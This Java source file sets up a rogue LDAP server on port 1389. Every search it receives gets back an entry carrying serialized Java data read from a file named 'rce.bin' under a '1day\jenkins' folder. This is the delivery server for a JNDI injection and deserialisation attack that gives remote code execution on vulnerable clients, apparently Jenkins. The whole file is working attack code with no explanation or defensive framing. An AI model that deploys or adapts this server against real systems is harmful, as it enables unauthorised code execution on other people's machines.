package ldapsimpleserver;

import com.unboundid.ldap.listener.*;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.*;
import com.unboundid.ldap.sdk.schema.Schema;

import java.net.InetAddress;
import java.nio.file.Files;
import java.nio.file.Paths;

public class Main {
    private InMemoryDirectoryServer server;

    public Main() throws Exception {
        InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig("dc=example,dc=com");
        config.setListenerConfigs(
                InMemoryListenerConfig.createLDAPConfig("default", InetAddress.getByName("0.0.0.0"), 1389, null));

        // Set up some basic schema, you can customize as needed
        Entry e = new Entry("dc=example");
        e.addAttribute("javaClassName", "WTF");
        e.addAttribute("javaSerializedData", Files.readAllBytes(Paths.get("D:\\1day\\jenkins\\rce.bin")));

        Schema schema = new Schema(e);

        config.setSchema(schema);
        config.addInMemoryOperationInterceptor(
                new OperationInterceptor());

        // Create an in-memory directory server
        server = new InMemoryDirectoryServer(config);
        server.startListening();
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        public OperationInterceptor() {

        }

        /**
         * {@inheritDoc}
         *
         * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)
         */
        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);

            try {
                e.addAttribute("javaClassName", "WTF");
                e.addAttribute("javaSerializedData", Files.readAllBytes(Paths.get("D:\\1day\\jenkins\\rce.bin")));
                result.sendSearchEntry(e);
                result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
                System.out.println("Served object WTF");
            } catch (Exception e1) {
                e1.printStackTrace();
            }
        }
    }

    public void stop() {
        server.shutDown(true);
    }

    public static void main(String[] args) {
        try {
            Main ldapServer = new Main();
            System.out.println("LDAP server is running on port 1389...");

            // Keep server running until interrupted
            Runtime.getRuntime().addShutdownHook(new Thread(ldapServer::stop));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
